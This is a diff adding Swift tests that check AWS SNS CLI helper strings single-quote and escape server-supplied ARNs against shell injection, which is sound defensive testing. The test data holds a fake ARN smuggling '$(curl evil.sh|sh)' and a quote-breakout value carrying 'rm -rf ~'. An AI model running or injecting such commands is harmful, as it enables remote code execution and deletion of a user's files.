@@ -100,6 +100,50 @@ struct SNSModelTests {
         #expect(cli.contains("--subscription-arn"))
     }
 
+    // MARK: - CLI Injection Safety (server-controlled ARNs)
+
+    // A malicious/compromised endpoint can return arbitrary topic/subscription ARNs.
+    // They must be single-quoted so shell metacharacters stay inert when pasted.
+    private static let maliciousArn = "arn:aws:sns:us-east-1:000:t$(curl evil.sh|sh)"
+
+    @Test("publishCLI single-quotes the topic ARN")
+    func publishCLIQuotesTopicArn() {
+        let topic = SNSTopic(topicArn: Self.maliciousArn)
+        let cli = topic.publishCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--topic-arn '\(Self.maliciousArn)'"))
+        #expect(!cli.contains("--topic-arn \(Self.maliciousArn) "))
+    }
+
+    @Test("listSubscriptionsCLI single-quotes the topic ARN")
+    func listSubscriptionsCLIQuotesTopicArn() {
+        let topic = SNSTopic(topicArn: Self.maliciousArn)
+        let cli = topic.listSubscriptionsCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--topic-arn '\(Self.maliciousArn)'"))
+    }
+
+    @Test("topic getAttributesCLI single-quotes the topic ARN")
+    func topicGetAttributesCLIQuotesTopicArn() {
+        let topic = SNSTopic(topicArn: Self.maliciousArn)
+        let cli = topic.getAttributesCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--topic-arn '\(Self.maliciousArn)'"))
+    }
+
+    @Test("subscription getAttributesCLI single-quotes the subscription ARN")
+    func subGetAttributesCLIQuotesArn() {
+        let sub = SNSSubscription(subscriptionArn: Self.maliciousArn, topicArn: "arn:topic", protocol_: "sqs", endpoint: "arn:queue", owner: "000")
+        let cli = sub.getAttributesCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("--subscription-arn '\(Self.maliciousArn)'"))
+        #expect(!cli.contains("--subscription-arn \(Self.maliciousArn) "))
+    }
+
+    @Test("publishCLI escapes single-quote breakout in topic ARN")
+    func publishCLITopicArnBreakout() {
+        let topic = SNSTopic(topicArn: "arn:t'; rm -rf ~; '")
+        let cli = topic.publishCLI(endpointUrl: "http://localhost:4566", region: "us-east-1")
+        #expect(cli.contains("'\\''"))
+        #expect(!cli.contains("--topic-arn arn:t'; rm"))
+    }
+
     // MARK: - SNSSubscriptionAttributes
 
     @Test("Parses subscription attributes from dict")
